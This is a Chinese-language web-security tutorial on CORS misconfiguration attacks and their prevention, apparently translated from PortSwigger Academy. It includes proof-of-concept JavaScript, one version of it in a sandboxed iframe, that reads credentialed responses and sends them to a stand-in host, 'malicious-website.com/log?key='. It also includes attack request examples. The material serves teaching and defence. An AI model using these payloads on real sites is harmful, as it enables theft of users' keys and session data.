# 跨域资源共享（CORS）

在本节中，我们将解释什么是跨域资源共享（CORS），描述一些基于跨域资源共享的攻击的常见示例，并讨论如何防范这些攻击。

## 什么是CORS（跨域资源共享）？

跨域资源共享（CORS）是一种浏览器机制，可实现对位于给定域外部的资源的受控访问。 它扩展了同源策略（SOP），并增加了灵活性。 但是，如果网站的CORS策略配置和实施不当，它也可能会导致基于跨域的攻击。 CORS并不是针对跨域攻击（例如跨站点请求伪造（CSRF））的保护措施。

![](../../.gitbook/assets/image%20%2816%29.png)

## 同源策略

同源策略是一种限制性的跨域规范，它限制了网站与源域之外的资源进行交互的能力。 起源于多年前的策略是为了响应潜在的恶意跨域交互，例如一个网站从另一个网站窃取了私人数据。 通常，它允许一个域向其他域发出请求，但不允许访问响应。

## 放宽同源策略

同源策略非常严格，因此已设计出各种方法来规避约束。 许多网站以要求完全跨域访问的方式与子域或第三方网站进行交互。 使用跨域资源共享（CORS）可以控制放宽同源策略。

## 由CORS配置问题引起的漏洞

许多现代网站都使用CORS允许从子域和受信任的第三方进行访问。 他们对CORS的实施可能包含错误或过于宽容，无法确保一切正常，这可能会导致可利用的漏洞。

服务器生成的来自客户端指定的Origin标头的ACAO标头

某些应用程序需要提供对许多其他域的访问。 维护允许域的列表需要不断的努力，任何错误都可能破坏功能。 因此，某些应用程序采取了有效地允许从任何其他域进行访问的简便方法。

一种方法是通过从请求中读取Origin标头，并包括一个响应标头，说明允许发出请求的原点。例如，考虑一个接收以下请求的应用程序：

```http
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

然后，它会响应：

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

这些标头指出，允许从请求域（malicious-website.com）进行访问，并且跨域请求可以包含cookie（Access-Control-Allow-Credentials：true），因此将在会话期间进行处理。

因为应用程序在Access-Control-Allow-Origin标头中反映了任意来源，所以这意味着绝对任何域都可以从易受攻击的域访问资源。 如果响应中包含任何敏感信息，例如API密钥或CSRF令牌，则可以通过在网站上放置以下脚本来检索此信息：

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='//malicious-website.com/log?key='+this.responseText;
};
```

**实验室**[具有基本原点反映的CORS漏洞](http://portswigger.cn/academy/subpage/allTopics/all-2.html)

### 解析Origin标头时出错

一些支持来自多个来源的访问的应用程序通过使用允许的来源白名单来实现。 收到CORS请求后，会将提供的来源与白名单进行比较。 如果来源出现在白名单中，那么它会反映在Access-Control-Allow-Origin标头中，以便授予访问权限。 例如，应用程序收到一个正常的请求，例如：

```http
GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com
```

应用程序根据其允许的来源列表检查提供的来源，如果在列表中，则按以下方式反映该来源：

```http
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com
```

实施CORS来源白名单时经常会出现错误。 一些组织决定允许从其所有子域（包括尚不存在的未来子域）进行访问。 并且某些应用程序允许从其他各种组织的域（包括其子域）进行访问。 这些规则通常通过匹配URL前缀或后缀或使用正则表达式来实现。实施中的任何错误都可能导致将访问权限授予意外的外部域。

例如，假设一个应用程序授予对以下列结尾的所有域的访问权限：

```text
normal-website.com
```

攻击者可能可以通过注册域来获得访问权限：

```text
hackersnormal-website.com
```

或者，假设应用程序授予对所有以

```text
normal-website.com
```

攻击者可以使用该域获得访问权限：

```text
normal-website.com.evil-user.net
```

### 白名单null初始值

Origin标头的规范支持值null。 在各种异常情况下，浏览器可能会在Origin标头中发送值null：

* 跨站点重定向。
* 来自序列化数据的请求。
* 使用文件请求:协议。
* 沙箱跨源请求。

某些应用程序可能会将空源列入白名单，以支持应用程序的本地开发。 例如，假设应用程序收到以下跨域请求：

```text
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```

服务器响应：

```text
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

在这种情况下，攻击者可以使用各种技巧来生成跨域请求，该请求在Origin标头中包含null值。 这将满足白名单的要求，从而导致跨域访问。 例如，可以使用以下格式的沙箱iframe跨域请求来完成此操作：

```markup
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

**实验室**[具有可信任的空来源的CORS漏洞](http://portswigger.cn/academy/subpage/allTopics/all-2.html#vulnerabilities-arising-from-cors-configuration-issues)

### 通过CORS信任关系利用XSS

甚至“正确”配置的CORS也会在两个来源之间建立信任关系。 如果网站信任易受跨站点脚本（XSS）攻击的来源，则攻击者可能利用XSS注入一些JavaScript，这些JavaScript使用CORS从信任易受攻击的应用程序的站点检索敏感信息。

给出以下请求：

```http
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```

如果服务器响应：

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

然后，在subdomain.vulnerable-website.com上发现XSS漏洞的攻击者可以使用该URL来通过URL检索API密钥：

```http
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```

### 使用配置不良的CORS破坏TLS

假设严格使用HTTPS的应用程序还将使用纯HTTP的受信任子域列入白名单。 例如，当应用程序收到以下请求时：

```http
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```

该应用程序响应：

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

在这种情况下，能够拦截受害者用户流量的攻击者可以利用CORS配置破坏受害者与应用程序的交互。 该攻击包括以下步骤：

* 受害者用户发出任何简单的HTTP请求
* 攻击者将重定向注入到：[http://trusted-subdomain.vulnerable-website.com](http://trusted-subdomain.vulnerable-website.com)
* 受害者的浏览器遵循重定向
* 攻击者拦截原始的HTTP请求，然后将包含CORS请求的欺骗响应返回给：[https://vulnerable-website.com](https://vulnerable-website.com)
* 受害者的浏览器发出CORS请求，包括来源：
* [http://trusted-subdomain.vulnerable-website.com](http://trusted-subdomain.vulnerable-website.com)
* 该应用程序允许该请求，因为这是白名单来源。 请求的敏感数据将在响应中返回
* 攻击者的欺骗页面可以读取敏感数据，并将其传输到攻击者控制下的任何域

即使易受攻击的网站对HTTPS的使用比较鲁莽，没有HTTP终结点并且所有cookie被标记为安全，此攻击也有效。

[实验室](http://portswigger.cn/web-security/cross-site-scripting/exploiting)[具有受信任的不安全协议的CORS漏洞](http://portswigger.cn/academy/subpage/allTopics/all-2.html#vulnerabilities-arising-from-cors-configuration-issues)

### 没有凭证的内联网和CORS

Access-Control-Allow-Credentials: true

大多数CORS攻击都依赖于响应标头的存在：

如果没有该标头，受害用户的浏览器将拒绝发送其cookie，这意味着攻击者将仅获得对未经身份验证的内容的访问权，他们可以通过直接浏览目标网站来轻松地访问这些内容。

但是，在一种常见的情况下，攻击者无法直接访问网站：当它是组织的Intranet的一部分并且位于私有IP地址空间中时。 内部网站的安全标准通常比外部网站的安全标准低，从而使攻击者能够发现漏洞并获得进一步的访问权限。 例如，专用网络内的跨域请求可能如下：

```http
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com
```

服务器响应：

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```

应用程序服务器信任来自任何来源的资源请求而没有凭据。 如果私有IP地址空间内的用户访问公共Internet，则可以从外部站点执行基于CORS的攻击，该站点使用受害者的浏览器作为访问Intranet资源的代理。

**LAB**[内部网络枢纽攻击的CORS漏洞](http://portswigger.cn/web-security/cors/lab-internal-network-pivot-attack)

## 如何预防基于CORS的攻击

CORS漏洞主要是由于配置错误而引起的。 因此，预防是一个配置问题。 以下各节介绍了一些针对CORS攻击的有效防御措施。

### 正确配置跨域请求

如果Web资源包含敏感信息，则应在Access-Control-Allow-Origin标头中正确指定来源。

### 只允许信任的网站

看起来似乎很明显，但是在Access-Control-Allow-Origin标头中指定的来源仅应是受信任的站点。 特别是，无需验证就可以动态反映跨域请求的来源而无需验证，因此应避免使用。

### 避免白名单为空

避免使用标头Access-Control-Allow-Origin：null。 来自内部文档和沙箱请求的跨域资源调用可以指定空来源。 应针对私有和公共服务器的可信来源正确定义CORS标头。

### 避免在内部网络中使用通配符

避免在内部网络中使用通配符。 当内部浏览器可以访问不受信任的外部域时，仅靠信任网络配置来保护内部资源是不够的。

### CORS不能替代服务器端安全策略

CORS定义了浏览器的行为，绝不能替代服务器端对敏感数据的保护-攻击者可以直接从任何可信来源伪造请求。 因此，除了正确配置的CORS之外，web服务器还应继续对敏感数据应用保护，例如身份验证和会话管理。

